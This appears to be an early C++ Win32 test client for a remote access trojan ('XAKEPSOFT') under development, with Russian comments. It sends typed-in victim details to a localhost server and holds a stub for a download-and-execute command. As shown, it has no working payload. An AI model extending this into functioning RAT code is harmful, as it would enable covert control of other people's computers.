#include "winsock2.h"
#include "windowsx.h"
#include "intrin.h"
#include "ntdll.h"
#include "iphlpapi.h"
#include "stdio.h"
#include "resource.h"
#include <string>
#include <iostream>

#pragma comment(lib, "iphlpapi")
#pragma comment(lib, "ws2_32")
#pragma warning(disable : 4996)

using namespace std;

WCHAR szClassName[] = L"XAKEPSOFT";
HWND TextField1, TextField2, TextField3, SendButton;

SOCKET Socket;
SOCKADDR_IN ServerAddr;

//полностью копируем структуры из сервера
struct CLIENTS
{
	SOCKET NUMBER; //это поле мы заполнять не будем, так как оно не важно
	char USERNAME[100]; //поле в которое мы скопируем имя юзера
	char OSVER[100]; //поле в которое мы скопируем версию ос
	char HWID[100]; //уникальное поле для этого юзера
};

struct DLE
{
	char URL[1000];
};

//полностью копируем структуры из сервера
struct CMDiDATA
{
	DWORD CMD; //тут у нас будут номера комманд
	char DATA[1000]; //а тут данные которые мы хотим принять или отправить серверу
};

LRESULT CALLBACK WindowProcedure(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:

		TextField1 = CreateWindow(L"EDIT",
			L"",
			WS_VISIBLE | WS_CHILD,
			10, 10, 465, 16,
			hwnd, (HMENU)1, NULL, NULL);

		TextField2 = CreateWindow(L"EDIT",
			L"",
			WS_VISIBLE | WS_CHILD,
			10, 34, 465, 16,
			hwnd, (HMENU)2, NULL, NULL);

		TextField3 = CreateWindow(L"EDIT",
			L"",
			WS_VISIBLE | WS_CHILD,
			10, 60, 465, 16,
			hwnd, (HMENU)3, NULL, NULL);

		SendButton = CreateWindow(L"BUTTON",
			L"SEND",
			WS_VISIBLE | WS_CHILD,
			10, 220, 100, 36,
			hwnd, (HMENU)4, NULL, NULL);
		break;

	case WM_COMMAND:
		switch (wParam)
		{
			case 4:
			{
				char *USERNAME, *OSVER, *HWID;
				int len1 = GetWindowTextLength(TextField1) + 1;
				int len2 = GetWindowTextLength(TextField2) + 1;
				int len3 = GetWindowTextLength(TextField3) + 1;
				if (len1 > 1 && len2 > 1 && len3 > 1)
				{
					USERNAME = (char*)malloc(len1);
					OSVER = (char*)malloc(len2);
					HWID = (char*)malloc(len3);

					GetWindowTextA(TextField1, &USERNAME[0], len1);
					GetWindowTextA(TextField2, &OSVER[0], len2);
					GetWindowTextA(TextField3, &HWID[0], len3);

					printf("USERNAME: %s\nOSVER: %s\nHWID: %s\n", USERNAME, OSVER, HWID);

					CMDiDATA indata; //создаем структуру отвечающую за протокол
					CLIENTS client; //создаем структуру отвечающую за инфу о клиенте
					memset(&indata, 0, sizeof(CMDiDATA)); //почистим 
					memset(&client, 0, sizeof(CLIENTS)); //почистим
					memcpy(client.HWID, HWID, sizeof(client.HWID));
					memcpy(client.USERNAME, USERNAME, sizeof(client.USERNAME));
					memcpy(client.OSVER, OSVER, sizeof(client.OSVER));

					printf("\n\nclient.HWID: %s\n\tlen: %d\n\nclient.USERNAME: %s\n\tlen: %d\n\nclient.OSVER: %s\n\tlen: %d\n\n", client.HWID, lstrlenA(client.HWID), client.USERNAME, lstrlenA(client.USERNAME), client.OSVER, lstrlenA(client.OSVER));

					indata.CMD = 0;
					memcpy(indata.DATA, &client, sizeof(CLIENTS));

					if (connect(Socket, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr)) == 0)
					{
						printf("connected. send data to server...\n");
						send(Socket, (char*)&indata, sizeof(CMDiDATA), 0);
					}

					free(USERNAME);
					free(OSVER);
					free(HWID);

				}
				break;
			}
		}
		break;

	case WM_DESTROY:
		PostQuitMessage(0); 
		break;
	default:
		return DefWindowProc(hwnd, message, wParam, lParam);
	}
	return 0;
}

DWORD WINAPI RecvThread(LPVOID param)
{
	while (TRUE)
	{
		CMDiDATA indata; //создаем структуру отвечающую за протокол
		memset(&indata, 0, sizeof(CMDiDATA)); //почистим 
		if (sizeof(CMDiDATA) == recv(Socket, (char*)&indata, sizeof(CMDiDATA), 0)); //прием сообщения от клиента
		{
			switch (indata.CMD)
			{
				case 1://если indata.cmd == 1
				{
					DLE dle; //инициализируем структуру DLE
					memset(&dle, 0, sizeof(dle)); //очищаем ее
					memcpy(&dle, indata.DATA, sizeof(indata.DATA)); //и копируем в нее indata.DATA
					break;
				}
				default:
					break;
			}
		}
	}
}

//будущая точка входа нашего ратника
int CALLBACK WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow)
{
	AllocConsole();

	freopen("CONIN$", "r", stdin);
	freopen("CONOUT$", "w", stdout);
	freopen("CONOUT$", "w", stderr);

	SetConsoleTitleA("XAKEPSOFT");

	HWND hwnd;               /* This is the handle for our window */
	MSG messages;            /* Here messages to the application are saved */
	WNDCLASSEX wincl;        /* Data structure for the windowclass */
								/* The Window structure */
	wincl.hInstance = hInstance;
	wincl.lpszClassName = szClassName;
	wincl.lpfnWndProc = WindowProcedure;
	wincl.style = CS_CLASSDC;
	wincl.cbSize = sizeof(WNDCLASSEX);
	wincl.hIcon = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1));
	wincl.hIconSm = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1));
	wincl.hCursor = LoadCursor(NULL, IDC_ARROW);
	wincl.lpszMenuName = NULL;
	wincl.cbClsExtra = 0;
	wincl.cbWndExtra = 0;
	wincl.hbrBackground = (HBRUSH)COLOR_BACKGROUND;

	if (!RegisterClassEx(&wincl))
		return 0;
	hwnd = CreateWindowEx(
		0,
		szClassName,
		L"XAKEPSOFT",
		WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		500,
		305,
		HWND_DESKTOP,
		NULL,
		hInstance,
		NULL
	);
	ShowWindow(hwnd, nCmdShow);

	//инициализируем структуры винсока
	struct WSAData wsaData;
	WORD DLLVersion = MAKEWORD(2, 1);
	WSAStartup(DLLVersion, &wsaData);

	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	ServerAddr.sin_family = AF_INET;
	//задаем конект на локалхост к восьмидесятому порту
	ServerAddr.sin_port = htons(80);
	ServerAddr.sin_addr.s_addr = inet_addr("127.0.0.1");

	HANDLE RECV[2];
	RECV[0] = CreateThread(NULL, 0, RecvThread, NULL, 0, 0); //создаем тред который будет бесконечно принимать сообщения от сервера
	//RECV[1] = CreateThread(NULL, 0, ConsoleReader, NULL, 0, 0);
	//данная функция должна будет ожидать завершения наших вдух потоков, но теперь надобность в ней отпала - так как мы рисуем теперь окно
	//WaitForMultipleObjects(2, RECV, TRUE, INFINITE); //Бесконечно ожидаем пока этот тред работает...

	while (GetMessage(&messages, NULL, 0, 0))
	{
		TranslateMessage(&messages);
		DispatchMessage(&messages);
	}

	return messages.wParam;
}
